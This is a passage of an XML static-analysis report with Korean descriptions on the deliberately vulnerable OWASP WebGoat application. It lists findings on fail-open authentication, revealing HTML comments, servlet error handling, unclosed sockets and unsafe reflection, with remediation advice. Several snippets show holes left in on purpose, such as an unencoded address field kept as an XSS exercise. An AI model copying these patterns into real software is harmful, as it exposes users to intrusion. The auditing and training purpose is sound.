		    s.setMessage("Invalid username and password entered.");</Snippet>
<TargetFunction>Dereferenced : username()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BC8C98608E9EB9F2AAD5C716652F0043" ruleID="03840C20-F22B-B900-B76E-63258B717C77">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>FailOpenAuthentication.java의 createContent() 메서드는 86 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>86</LineStart>
<Snippet>	    {
		// The parameter was omitted. set fail open status complete
		if (username.length() &gt; 0
			&amp;&amp; e.getMessage().indexOf("not found") != -1)
		{</Snippet>
<TargetFunction>Dereferenced : username()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>System Information Leak: HTML Comment in JSP</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>ViewProfile.jsp의 1 줄에서 HTML 주석에 노출된 정보는 공격자가 시스템을 파악하고 공격 계획을 세우는 데 도움이 됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>HTML 주석은 공격자에게 동적으로 생성된 웹 페이지에 대한 쉬운 소스 정보를 제공합니다.

예제 1:


&lt;!-- TBD: this needs a security audit --&gt;
&lt;form method="POST" action="recalcOrbit"&gt;
...


무해하게 보이는 주석이라도 시스템이 실행되는 방법을 이해하려는 사용자에게는 유용할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>다음 구성을 web.xml 파일에 추가합니다. 그러면 사용자에게 전송되는 콘텐트에서 HTML 주석이 제외됩니다.

&lt;web-app&gt;
  ...
  &lt;context-param&gt;
      &lt;param-name&gt;facelets.SKIP_COMMENTS&lt;/param-name&gt;
      &lt;param-value&gt;true&lt;/param-value&gt;
  &lt;/context-param&gt;
  ...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="F19A3E30D5A2BCE3F3617F4A4FCA45D6" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp의 1 줄에서 HTML 주석에 노출된 정보는 공격자가 시스템을 파악하고 공격 계획을 세우는 데 도움이 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>1</LineStart>
<Snippet>&lt;!--
STAGE 4 FIXES Look for the &lt;-- STAGE 4 - FIX
--&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="65D9CF95D4DC5BA1E5FD281D2F5C0650" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp의 84 줄에서 HTML 주석에 노출된 정보는 공격자가 시스템을 파악하고 공격 계획을 세우는 데 도움이 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>84</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;!-- Encode data that might contain HTML content to protect against XSS --&gt;

						&lt;%=webSession.htmlEncode(employee.getPersonalDescription())%&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DC2DCA50559A993EAA03A50D4960A30C" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp의 31 줄에서 HTML 주석에 노출된 정보는 공격자가 시스템을 파악하고 공격 계획을 세우는 데 도움이 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>31</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;!-- STAGE 4 - FIX  Note that the description value below gets encoded and address1 here is not --&gt;

						&lt;%=employee.getAddress1()%&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>System Information Leak: Incomplete Servlet Error Handling</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead Servlet은 doPost()의 모든 예외 사항을 캐치하지 못합니다. Servlet이 모든 예외 사항을 캐치하지 못하면 공격자가 공격을 계획하는 데 도움이 되는 디버깅 정보를 노출할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Servlet에 예외 사항이 발생하면 Servlet 컨테이너가 사용자에게 보내는 기본 오류 응답에는 보통 디버깅 정보가 포함됩니다. 디버깅 정보는 공격자에게 아주 쓸모가 있습니다. 예를 들어, 스택 추적은 공격자에게 잘못된 SQL 쿼리 문자열, 사용 중인 데이터베이스 유형 및 응용 프로그램 컨테이너 버전을 보여줄 수 있습니다. 공격자는 이 정보를 사용하여 이 구성 요소의 알려진 취약점을 공략합니다.

예제 1: 다음 메서드에서 DNS 조회 실패로 Servlet에 예외 사항이 발생합니다.


protected void doPost (HttpServletRequest req,
                    HttpServletResponse res)
              throws IOException {
    String ip = req.getRemoteAddr();
    InetAddress addr = InetAddress.getByName(ip);
    ...
    out.println("hello " + addr.getHostName());
}


예제 2: 다음 메서드는 매개 변수 "name"이 요청한 부분이 아닌 경우 NullPointerException이 발생합니다.


protected void doPost (HttpServletRequest req,
                    HttpServletResponse res)
              throws IOException {
    String name = getParameter("name");
    ...
    out.println("hello " + name.trim());
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>모든 최상위 수준 Servlet 메서드는 Throwable을 캐치(catch)하여 Servlet의 오류 응답 메커니즘이 호출될 기회를 최소화해야 합니다. 

예제 3: Example 1의 메서드는 다음과 같이 다시 작성해야 합니다.


protected void doPost (HttpServletRequest req,
                    HttpServletResponse res) {
      try {
          String ip = req.getRemoteAddr();
          InetAddress addr = InetAddress.getByName(ip);
      ...
          out.println("hello " + addr.getHostName());
      }catch (Throwable t) {
          logger.error("caught throwable at top level", t);
      }
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="54251F5A135A88AE020A82374D18D74A" ruleID="97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D">
                            <Category>System Information Leak: Incomplete Servlet Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Controller Servlet은 doPost()의 모든 예외 사항을 캐치하지 못합니다. Servlet이 모든 예외 사항을 캐치하지 못하면 공격자가 공격을 계획하는 데 도움이 되는 디버깅 정보를 노출할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Controller.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/servlets/Controller.java</FilePath>
<LineStart>60</LineStart>
<Snippet>

    protected void doPost(HttpServletRequest request,
	    HttpServletResponse response) throws ServletException, IOException
</Snippet>
<TargetFunction>Function: doPost()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="961AB637F576744C071C9F31DED9DB0C" ruleID="97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D">
                            <Category>System Information Leak: Incomplete Servlet Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead Servlet은 doPost()의 모든 예외 사항을 캐치하지 못합니다. Servlet이 모든 예외 사항을 캐치하지 못하면 공격자가 공격을 계획하는 데 도움이 되는 디버깅 정보를 노출할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>119</LineStart>
<Snippet>     *            Description of the Exception
     */
    public void doPost(HttpServletRequest request, HttpServletResponse response)
	    throws IOException, ServletException
    {</Snippet>
<TargetFunction>Function: doPost()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F74DC7B8D62E094A5E141FA3A0BE003E" ruleID="97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D">
                            <Category>System Information Leak: Incomplete Servlet Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>LessonSource Servlet은 doPost()의 모든 예외 사항을 캐치하지 못합니다. Servlet이 모든 예외 사항을 캐치하지 못하면 공격자가 공격을 계획하는 데 도움이 되는 디버깅 정보를 노출할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>67</LineStart>
<Snippet>     * @exception  ServletException  Description of the Exception
     */
    public void doPost(HttpServletRequest request, HttpServletResponse response)
	    throws IOException, ServletException
    {</Snippet>
<TargetFunction>Function: doPost()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Unreleased Resource: Sockets</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Interceptor.java의 doFilter() 함수는 93 줄의 Socket()에 의해 할당된 소켓을 해제하지 못할 수도 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>프로그램이 소켓을 해제하지 못할 수도 있습니다.


리소스 누출은 최소한 두 가지 공통 원인이 있습니다.

- 오류 조건 및 기타 예외 상황.

- 프로그램의 어떤 부분이 리소스 해제를 담당하고 있는지에 대한 혼란

대부분의 공개되지 않은 리소스 문제는 일반적인 소프트웨어 안정성 문제를 일으킵니다. 하지만 공격자가 의도적으로 리소스 누출을 일으킬 수 있는 경우 공격자가 리소스 풀을 고갈시켜 DoS(Denial of Service) 공격을 실행할 수도 있습니다.

예제 1: 다음 메서드는 자신이 연 소켓을 닫지 않습니다. 사용량이 많은 환경에서는 이로 인해 JVM이 소켓을 모두 소진시키는 결과를 초래할 수도 있습니다.


private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException
{
  Socket sock = new Socket(host, port);
  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));

  while ((String socketData = reader.readLine()) != null) {
    System.out.println(socketData);
  }
}


예제 2: 일반적인 조건에서 다음 해결책은 소켓 및 연결된 모든 스트림을 올바르게 닫습니다. 그러나 입력을 읽거나 화면에 데이터를 쓰는 동안 예외가 발생하는 경우, 소켓 개체가 닫히지 않습니다. 이런 일이 빈번하게 발생하는 경우, 시스템에는 소켓이 부족하고 시스템은 더 이상의 연결을 처리할 수 없습니다.


private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException
{
  Socket sock = new Socket(host, port);
  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));

  while ((String socketData = reader.readLine()) != null) {
    System.out.println(socketData);
  }
  sock.close();
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>finally 블록의 소켓 리소스를 해제하십시오. Example 2의 코드는 다음과 같이 다시 작성해야 합니다.


private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException
{
  Socket sock;
  BufferedReader reader;

  try {
    sock = new Socket(host, port);
    reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));

    while ((String socketData = reader.readLine()) != null) {
        System.out.println(socketData);
    }
  }
  finally {
    safeClose(sock);
  }
}

public static void safeClose(Socket s) {
  if (s != null &amp;&amp; !s.isClosed()) {
    try {
      s.close();
    } catch (IOException e) {
      log(e);
    }
  }
}


이 해결책은 도우미 함수를 사용하여 소켓을 닫으려 할 때 발생할 수 있는 예외를 기록합니다. 이 도우미 함수는 소켓을 닫아야 할 때마다 재사용될 것입니다.

또한 echoSocket() 메서드는 sock 소켓 개체를 null로 초기화하지 않습니다. 대신 safeClose()를 호출하기 전에 sock가 null이 아닌지 검사합니다. null 검사를 하지 않으면 Java 컴파일러는 sock가 초기화되지 않았다고 보고합니다. 이 방법은 uninitialized variable을 발견하는 Java 기능을 이용한 것입니다. sock를 더 복잡한 방법을 사용하여 null로 초기화하면 초기화하지 않고 sock를 사용하는 경우를 컴파일러가 발견할 수 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 또한 소켓을 닫으면 getInputStream 및 getOutputStream을 통해 얻은 모든 스트림이 닫힙니다. 반대로 소켓의 스트림을 닫으면 전체 소켓이 닫힙니다. 의심되는 경우, 항상 두 가지 모두를 명시적으로 닫는 것이 더 안전합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5FE51BD703C66A13DECFB42082887BB3" ruleID="6DEAABAF-72E9-4AD6-8903-0EB8E858CB89">
                            <Category>Unreleased Resource: Sockets</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Interceptor.java의 doFilter() 함수는 93 줄의 Socket()에 의해 할당된 소켓을 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>97</LineStart>
<Snippet>		if (osgSocket != null)
		{
		    out = new PrintWriter(osgSocket.getOutputStream(), true);
		    in = new BufferedReader(new InputStreamReader(osgSocket
			    .getInputStream()));</Snippet>
<TargetFunction>osgSocket.getOutputStream()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F3F299BD20D68BF330BB7E2DD469BA79" ruleID="6DEAABAF-72E9-4AD6-8903-0EB8E858CB89">
                            <Category>Unreleased Resource: Sockets</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Interceptor.java의 doFilter() 함수는 93 줄의 Socket()에 의해 할당된 소켓을 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>93</LineStart>
<Snippet>		    &amp;&amp; osgServerPort != null &amp;&amp; osgServerPort.length() != 0)
	    {
		osgSocket = new Socket(osgServerName, Integer
			.parseInt(osgServerPort));
		if (osgSocket != null)</Snippet>
<TargetFunction>osgSocket = new Socket(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6E883028625C238DE857656E3B8CB5B4" ruleID="6DEAABAF-72E9-4AD6-8903-0EB8E858CB89">
                            <Category>Unreleased Resource: Sockets</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Interceptor.java의 doFilter() 함수는 93 줄의 Socket()에 의해 할당된 소켓을 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>99</LineStart>
<Snippet>		    out = new PrintWriter(osgSocket.getOutputStream(), true);
		    in = new BufferedReader(new InputStreamReader(osgSocket
			    .getInputStream()));
		    //String message = "HTTPRECEIVEHTTPREQUEST,-,DataValidation_SqlInjection_Basic.aspx";
		    //out.println(message);</Snippet>
<TargetFunction>osgSocket.getInputStream()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Unsafe Reflection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>공격자가 DatabaseUtilities.java의 66 줄에서 forName() 리플렉션 메서드의 인수를 제어할 수 있습니다. 이로 인해 응용 프로그램을 통해 예기치 못한 제어 흐름 경로를 만들어 보안 검사를 무시할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>공격자가 응용 프로그램이 인스턴스화할 클래스 또는 호출할 메서드를 결정하는 데 사용할 값을 제공하게 되면 응용 프로그램을 통해 응용 프로그램 개발자가 의도하지 않은 제어 흐름 경로를 만들 가능성이 있습니다. 이 공격은 공격자가 authentication 또는 access control 검사를 무시하거나 응용 프로그램이 오작동을 일으키도록 합니다. 임의의 메서드나 생성자에게 전달되는 인수를 제어하는 기능도 교활한 공격자에게 공격을 성공시키는 데 필요한 유리한 조건을 제공할 수 있습니다. 

이런 상황은 공격자가 응용 프로그램의 classpath에 있는 위치에 파일을 업로드하거나 응용 프로그램의 classpath에 새 항목을 추가하게 되면 최악의 시나리오가 됩니다. 어느 쪽이든 공격자는 리플렉션을 사용하여 응용 프로그램에 새로운 악의적인 동작을 주입할 수 있습니다.

예제: 프로그래머가 리플렉션 API를 사용하는 공통된 이유는 자신만의 명령 디스패처를 구현하기 위해서입니다. 다음 예제는 리플렉션을 사용하지 않는 명령 디스패처를 보여줍니다.


String ctl = request.getParameter("ctl");
Worker ao = null;
if (ctl.equals("Add")) {
  ao = new AddCommand();
} else if (ctl.equals("Modify")) {
  ao = new ModifyCommand();
} else {
  throw new UnknownActionError();
}
ao.doAction(request);


프로그래머가 이 코드를 다음과 같이 리플렉션을 사용하도록 리팩터링할 수 있습니다.


    String ctl = request.getParameter("ctl");
    Class cmdClass = Class.forName(ctl + "Command");
    Worker ao = (Worker) cmdClass.newInstance();
    ao.doAction(request);


리팩터링은 처음에는 많은 장점이 있는 것처럼 보입니다. 코드 줄이 줄고 if/else 블록 전체가 사라질 뿐 아니라 이제는 명령 디스패처를 수정하지 않고 새 명령 유형을 추가하는 것도 가능합니다.

하지만 리팩터링은 공격자가 Worker 인터페이스를 구현하는 개체를 인스턴스화할 수 있습니다. 명령 디스패처가 access control을 계속 담당하는 경우, 프로그래머는 Worker 인터페이스를 구현하는 새 클래스를 만들 때마다 디스패처의 access control 코드를 수정해야 합니다. access control 코드를 수정하지 않으면 일부 Worker 클래스는 access control을 갖지 못합니다.

액세스 제어 문제를 해결하는 한 가지 방법은 Worker 개체가 액세스 제어 검사 수행을 담당하게 만드는 것입니다. 리팩터링된 코드의 예제는 다음과 같습니다.


String ctl = request.getParameter("ctl");
Class cmdClass = Class.forName(ctl + "Command");
Worker ao = (Worker) cmdClass.newInstance();
ao.checkAccessControl(request);
ao.doAction(request);


이 코드는 보다 개선되긴 했지만 분산된 방식으로 access control을 다루기 때문에 프로그래머가 access control 실수를 저지르기가 더 쉽습니다.

또한 이 코드는 리플렉션을 사용하여 명령 디스패처를 작성하는 데서 또 다른 보안 문제를 야기합니다. 공격자가 모든 종류의 개체에 대해 기본 생성자를 호출할 수 있습니다. 실제로 공격자는 Worker 인터페이스를 구현하는 개체에만 국한되어 있는 것은 아닙니다. 시스템의 모든 개체의 기본 생성자를 호출할 수 있습니다. 개체가 Worker 인터페이스를 구현하지 않는 경우 ClassCastException이 ao에 할당되기 전에 발생하지만 생성자가 공격자에게 유리한 작업을 수행하는 경우 이미 피해를 입은 것입니다. 이 시나리오는 간단한 응용 프로그램에서는 비교적 피해 정도가 약하지만 아주 복잡한 큰 응용 프로그램에서는 공격자가 얼마든지 생성자를 찾아 공격 도구로 이용할 수 있습니다.

즉각적인 호출자의 클래스 로더 검사 사용 작업을 수행하는 특정 Java API가 리플렉션 호출로 인해 반환된 신뢰할 수 없는 개체에서 호출되는 경우 접근 검사가 코드 실행 체인을 더욱 손상시킬수도 있습니다. 이러한 Java API는 실행 체인의 모든 호출자가 필요한 보안 권한을 갖도록 보장하는 SecurityManager 검사를 무시합니다. 리플렉션에 의해 반환된 신뢰할 수 없는 개체에서 API가 호출되지 않도록 주의해야 합니다. 이러한 API는 보안 접근 검사를 무시하고 시스템이 원격 공격에 취약해지도록 할 수 있기 때문입니다. 이러한 Java API에 대한 자세한 내용은 Secure Coding Guidelines for the Java Programming Language의 Guideline 9를 참조하십시오.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Unsafe reflection을 예방하는 최선의 방법은 다음 간접 참조를 사용하는 것입니다. 즉, 사용자가 지정할 수 있는 올바른 이름 목록을 만들어 사용자가 목록에서 선택하는 것만 허용하는 것입니다. 이 접근 방식에서는 사용자가 제공하는 입력을 리플렉션 API에 전달되는 이름을 지정하는 데 직접 사용하지 않습니다.

리플렉션은 사용자 지정 데이터 기반 아키텍처를 만드는 데 사용할 수도 있습니다. 이 아키텍처는 구성 파일이 응용 프로그램이 사용하는 개체의 형식과 조합을 결정하는 수단이 됩니다. 이런 프로그래밍 방식은 다음과 같은 보안 문제를 안고 있습니다.

- 프로그램을 제어하는 구성 파일은 프로그램 소스 코드의 필수적인 부분이므로 보호하고 검토해야 합니다.

- 구성 파일이 응용 프로그램마다 고유하기 때문에 디자인의 보안성을 평가하려면 고유한 작업을 수행해야 합니다.

- 응용 프로그램의 의미를 사용자 지정 형식의 구성 파일이 정의하기 때문에 최적의 정적 분석 결과를 얻으려면 사용자 지정 규칙이 있어야 합니다.

이런 이유로 팀에서 보안 평가에 엄청난 노력을 투입할 수 있는 상황이 아니면 이런 형식의 디자인은 피하는 것이 좋습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 리플렉션 메서드 호출의 일부로 사용자 입력을 사용하기 전에 반드시 확인해야 합니다. 응용 프로그램이 운영 체제, file system 또는 기타 시스템 구성 요소보다 빠른 속도로 발전하기 때문에 사용자 입력값 검증에 필요한 작업은 사용자 데이터를 다른 시스템 구성 요소에 보내는 데 필요한 입력 확인보다 훨씬 빠르게 발전해야 합니다. 현재는 검증이 올바로 동작하더라도 앞으로는 정확하지 않을 수 있습니다.

2. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="CF6350F88FA69DDBB6F671F1EE6C01D7" ruleID="E1B32227-C0BD-4A57-9C34-6794D9089A21">
                            <Category>Unsafe Reflection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자가 DatabaseUtilities.java의 66 줄에서 forName() 리플렉션 메서드의 인수를 제어할 수 있습니다. 이로 인해 응용 프로그램을 통해 예기치 못한 제어 흐름 경로를 만들어 보안 검사를 무시할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>66</LineStart>
<Snippet>	    throws ClassNotFoundException, SQLException
    {
	Class.forName(s.getDatabaseDriver());

	return (DriverManager.getConnection(s.getDatabaseConnectionString()));</Snippet>
<TargetFunction>java.lang.Class.forName()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3E83F22FF8125E7E55A1C3D3ED795D20" ruleID="E1B32227-C0BD-4A57-9C34-6794D9089A21">
                            <Category>Unsafe Reflection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자가 DatabaseUtilities.java의 66 줄에서 forName() 리플렉션 메서드의 인수를 제어할 수 있습니다. 이로 인해 응용 프로그램을 통해 예기치 못한 제어 흐름 경로를 만들어 보안 검사를 무시할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>66</LineStart>
<Snippet>	    throws ClassNotFoundException, SQLException
    {
	Class.forName(s.getDatabaseDriver());

	return (DriverManager.getConnection(s.getDatabaseConnectionString()));</Snippet>
<TargetFunction>java.lang.Class.forName()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="506291FCCB708103B698A730AF545733" ruleID="E1B32227-C0BD-4A57-9C34-6794D9089A21">
                            <Category>Unsafe Reflection</Category>
                            <Folder>Low</Folder>
